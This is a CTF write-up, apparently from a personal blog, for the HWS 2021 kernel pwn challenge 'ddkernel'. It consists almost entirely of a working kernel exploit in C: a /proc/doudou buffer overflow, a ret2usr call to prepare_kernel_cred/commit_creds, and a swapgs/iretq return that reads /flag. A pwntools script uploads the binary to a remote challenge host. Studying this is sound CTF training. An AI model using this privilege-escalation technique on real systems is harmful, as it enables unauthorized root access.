---
title: HWS 2021 入营选拔赛 内核Pwn ddkernel
date: 2021-02-02 00:00:00
categories:
- CTF/Pwn
tags:
---

> 更新中...

所有题目附件：[HWS20210128.zip](https://xuanxuanblingbling.github.io/assets/attachment/HWS20210128.zip)

```c
asm(
    "execve:\n"
	"mov $59,%rax\n"
	"syscall\n"
	"ret\n"

	"open:\n"
	"mov $2,%rax\n"
	"syscall\n"
	"ret\n"

	"read:\n"
	"mov $0,%rax\n"
	"syscall\n"
	"ret\n"

	"write:\n"
	"mov $1,%rax\n"
	"syscall\n"
	"ret\n"

	"exit:\n"
	"mov $60,%rax\n"
	"syscall\n"
	"ret\n"
);

void * commit_creds = 0xffffffff8105d235;
void * prepare_kernel_cred =  0xffffffff8105d157;

void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    /* puts("[*] root now."); */
}
unsigned long user_cs, user_ss, user_eflags,user_sp,shell2;
void save_stats(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
         :
         : "memory"
     );
}

void shell(){
    //execve("/bin/sh",&a,0);
    char buf[100];
    int a = open("/flag",0);
    read(a,buf,100);
    write(1,buf,100);
    exit(0);
}

int exp(){
    get_root();
    shell2 = (unsigned long)shell;
    asm(
        "push %0\n"
        "push %1\n"
        "push %2\n"
        "push %3\n"
        "push %4\n"
        "swapgs \n"
        "iretq \n"
        :
         :"m"(user_ss), "m"(user_sp), "m"(user_eflags),"m"(user_cs),"m"(shell2)
         : "memory"
     );
}

int main(){
    save_stats();
    char a[0x107];
    long long * payload;
    payload = (long long *)a;
    payload[0] = 0xaaaaaaaaaaaaaaaa;
    payload[1] = 0xaaaaaaaaaaaaaaaa;
    payload[2] = (void *)exp;
    int f = open("/proc/doudou",1);
    write(f,a,0x107);
    exit(0);
    return 0;
}
```


```bash
gcc -e main -nostdlib -static exp.c -o exp
cp ./exp ./rootfs/
cd rootfs && find . | cpio -H newc -o > ../rootfs.img
cd .. && ./boot.sh
```

```python
from pwn import *
#context(log_level='debug')
#io = process("./boot.sh")
io = remote("183.129.189.60",10015)

def exec_cmd(cmd):
    io.sendline(cmd)
    io.recvuntil("$ ")

def upload():
    p = log.progress("Upload")
    with open("./exp", "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data)
    io.recvuntil("$ ")

    for i in range(0, len(encoded), 600):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> /tmp/benc" % (encoded[i:i+600]))

    exec_cmd("cat /tmp/benc | base64 -d > /tmp/bout")
    exec_cmd("chmod +x /tmp/bout")

upload()
io.interactive()
```